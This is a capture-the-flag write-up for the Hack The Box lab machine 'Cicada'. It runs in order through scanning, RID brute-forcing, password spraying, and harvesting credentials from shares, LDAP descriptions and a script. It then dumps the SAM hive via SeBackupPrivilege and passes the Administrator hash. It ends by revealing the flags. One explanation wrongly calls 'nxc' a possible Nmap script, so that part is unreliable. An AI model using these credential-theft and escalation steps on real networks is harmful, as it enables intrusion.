Hola! Today lets deep dive into another adventure called "[Cicada](https://app.hackthebox.com/machines/Cicada)"

Cicada is a friendly beginner machine about Active Directory on HackThebox.

For this machine, we will utilize the following tools
1. netexec
2. smbclient
3. impacket-smbclient
4. ldapdomaindump
5. winrm/evil-winrm

## Reconnaissance
Like always start with initial footholding scans on the `ip` with `nmap`

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/cicada]
└─$ nmap -sCV -Pn 10.10.11.35
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 16:19 IST
Nmap scan report for 10.10.11.35
Host is up (0.31s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-12 17:50:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-12T17:50:49
|_  start_date: N/A
|_clock-skew: 6h59m52s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

There are 11 open ports and since this is a windows machine and have to access ldap, kerberos  etc. We have ports `139` and `445` open and we can see that the SMB ports are open. 

Before going further add the remote `ip addr` and domain `cicada.htb` to local dns file.

Now, it is time to enumerate SMB with NetExec.

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/cicada]
└─$ nxc smb 10.10.11.35 -u Guest -p ''
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\Guest: 
```

This machine have guest session which is allowed to enumerate shares and users. We can enumerate users with `--rid-brute` parameter of NetExec shown below.

```bash
nxc smb 10.10.11.35 -u Guest -p '' --rid-brute > c.txt
```

Breakdown of command as follows
- **`nxc smb`**:
    - This part suggests you are using a tool, potentially **Nmap (NSE)** or another specialized tool for SMB enumeration.
    - If it’s **Nmap**, this may indicate an NSE script related to SMB scanning or enumeration, but the `nxc` is unusual for Nmap. It may be a wrapper script or alias for convenience (check for custom scripts or commands in your environment).
- **`-u Guest`**:
    - The `-u` flag specifies the **username** for the SMB login attempt.
    - Here, you are using the **Guest** account, a common account with limited permissions on Windows systems.
- **`-p ''`**:
    - The `-p` flag specifies the **password**. The empty `''` (blank quotes) indicates that no password is being used, meaning you are attempting to log in with the **Guest account** and no password.
- **`--rid-brute`**:
    - This option indicates that you are performing a **RID (Relative Identifier) brute force attack**.
    - **RID Brute Force** attempts to enumerate user accounts by brute-forcing RID values on an SMB server. This technique exploits the predictable sequence of RID numbers (e.g., 500 for Administrator, 501 for Guest, etc.) to guess usernames or enumerate valid accounts.
- **`> c.txt`**:
    - This part **redirects the output** of the command to a file called `c.txt`.


After that, we run a command shown below to get usernames.

```bash
cat c.txt | grep SidTypeUser | cut -d '\' -f 2 | awk '{print $1}' > usernames.txt
```

Then we will get a list of users.

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/cicada]
└─$ ls
c.txt  usernames.txt

┌──(dkvv㉿kali)-[~/Desktop/htb/machines/cicada]
└─$ cat usernames.txt 
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

To further our SMB enumeration efforts, we utilized **netexec** and **Impacket's smbclient**. These tools allow us to probe the target system for available SMB shares, helping us uncover shared directories and files that might otherwise remain hidden. By identifying accessible SMB shares, we can gain insight into potentially misconfigured permissions or sensitive data exposure, which could be leveraged in subsequent stages of an attack.

```bash
nxc smb 10.10.11.35 -u Guest -p '' --shares
```

### Breakdown:


1. **`-u Guest`**:
    
    - This flag specifies the **username** for logging into the SMB service. In this case, you're using the **Guest** account, a common account on many Windows systems, often with limited privileges.
2. **`-p ''`**:
    
    - The `-p` flag specifies the **password** to be used for the SMB login. The empty `''` (blank quotes) indicate no password is provided, so you are attempting to authenticate with a blank password for the **Guest** account.
3. **`--shares`**:
    
    - This option instructs the tool to **list the available SMB shares** on the target machine (`10.10.11.35`).
    - The SMB shares are directories that have been made accessible over the network using the SMB protocol, and they could contain important information or misconfigurations.
```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/cicada]
└─$ nxc smb 10.10.11.35 -u Guest -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\Guest: 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
```

Here we can see an interesting directory called `HR`. Lets see what it is

![[Pasted image 20241012184325.png]]

Let's see what it is now

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/cicada]
└─$ cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```

It contains the password but still we don't know the username so lets perform password spray attacks using previous usernames we recovered.

```bash
nxc smb 10.10.11.35 -u usernames.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

After  a minute we get the following results.

![[Pasted image 20241012192555.png]]

```bash
<snip>
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

The password is a match for the user `michael.wrightson`

Now lets perform ldapdomaindump with the known creds

```bash
ldapdomaindump ldap://10.10.11.35 -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![[Pasted image 20241012195533.png]]

Going through the files you can find password for user `David Orelious` in the file `domain_users.html`


![[Pasted image 20241012195815.png]]


Another effective way of doing this by using `netexec`

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/cicada]
└─$ nxc ldap 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -M get-desc-users
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
GET-DESC... 10.10.11.35     389    CICADA-DC        [+] Found following users: 
GET-DESC... 10.10.11.35     389    CICADA-DC        User: Administrator description: Built-in account for administering the computer/domain
GET-DESC... 10.10.11.35     389    CICADA-DC        User: Guest description: Built-in account for guest access to the computer/domain
GET-DESC... 10.10.11.35     389    CICADA-DC        User: krbtgt description: Key Distribution Center Service Account
GET-DESC... 10.10.11.35     389    CICADA-DC        User: david.orelious description: Just in case I forget my password is aRt$Lp#7t*VQ!3
```

Using this new set of credentials we can access further access to `smbshares`

```bash
nxc smb 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

![[Pasted image 20241012204932.png]]

We can see that `david.orelious` has read permissions to `DEV` share.

Let's connect to that `DEV` share using `impacket-smbclient`

```bash
impacket-smbclient cicada.htb/david.orelious:'aRt$Lp#7t*VQ!3'@10.10.11.35
```

In the `DEV` we can find a powershell script which consist of credentials for user `emily.oscars`

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/cicada]
└─$ impacket-smbclient cicada.htb/david.orelious:'aRt$Lp#7t*VQ!3'@10.10.11.35
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Type help for list of commands
# shares
ADMIN$
C$
DEV
HR
IPC$
NETLOGON
SYSVOL
# use DEV
# ls
drw-rw-rw-          0  Wed Aug 28 22:57:31 2024 .
drw-rw-rw-          0  Thu Mar 14 17:51:29 2024 ..
-rw-rw-rw-        601  Wed Aug 28 22:58:22 2024 Backup_script.ps1
# cat Backup_script.ps1

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"

```

Now we can use this credentials to connect to C$ share by netexec or smbclient. Since we know emily oscars can connect to the system. I wanted to try out the `winrm` tool. So I will connect to the system by using it.

```bash
nxc winrm 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

After a moment the result as follows

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/cicada]
└─$ nxc winrm 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' 
WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

Since winrm is possible, I shall use `evil-winrm` which provides more flexibility over `winrm` in pot exploitation process.

```bash
evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

After execution, you will successfully connect to the `C$` share

![[Pasted image 20241012214333.png]]

Since we are Documents directory after spending couple of minutes rummaging through the directories and file.

Finally found `user.txt` in the path `C:\Users\emily.oscars.CICADA\Desktop`

![[Pasted image 20241012215415.png]]



## Privilege escalation
Now let's try and get the super user access to find the root flag but first lets check what permissions do we have

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 

```

We can see that user `emily.oscars` has SeBackupPrivilege right. We can utilize this right for copying the sam files and system files to our local machine. First we need to create a temp directory and copy both sam and system files into it. Go to the `C:\` directory

```bash
*Evil-WinRM* PS C:\> mkdir temp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/12/2024   4:31 PM                temp


*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> 
```


Now let's copy the sam and system file to temp using reg
```bash
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
```

If done right the files will be copied successfully.

```bash
*Evil-WinRM* PS C:\temp> reg save hklm\sam C:\temp\sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\temp> reg save hklm\system C:\temp\system.hive
The operation completed successfully.

*Evil-WinRM* PS C:\temp> dir


    Directory: C:\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/12/2024   4:35 PM          49152 sam.hive
-a----        10/12/2024   4:36 PM       18518016 system.hive

```

Now we download these files to our machine using download command

```bash
*Evil-WinRM* PS C:\temp> download sam.hive
                                        
Info: Downloading C:\temp\sam.hive to sam.hive
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system.hive
                                        
Info: Downloading C:\temp\system.hive to system.hive
                                        
Info: Download successful!
```

Now let's connect to the machines as administrator by dumping the administrator hash from these files by utilizing `impacket-secretsdump` 

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Then we get the following result.

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/cicada]
└─$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 

```

So we can now use the Administrator hash to perform `pass the hash(PTH)` attack

```bash
evil-winrm -i cicada.htb -u "Administrator" -H "2b87e7c93a3e8a0ea4a581937016f341"
```

If it has executed successfully then we are in the system with root privileges.

Explore the directories to find the `root` flag

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/cicada]
└─$ evil-winrm -i cicada.htb -u "Administrator" -H "2b87e7c93a3e8a0ea4a581937016f341"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator

```

Go to the `Desktop` folder of the user `Administrator` to enjoy the root flag

![[Pasted image 20241012225534.png]]


That's all for this machine

![[Pasted image 20241012231000.png]]

<details>
  <summary>Click to reveal</summary>
  User: 14f35f831617b4901812d28c2cc9f1c1
  Root: 735b3cdc31980f0b0bfbfe9b983a0bce
</details>


## References:
1. [SeBackupPrivilege](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md): It is a Windows privilege that provides a user or process with the ability to read files and directories, regardless of the security settings on those objects.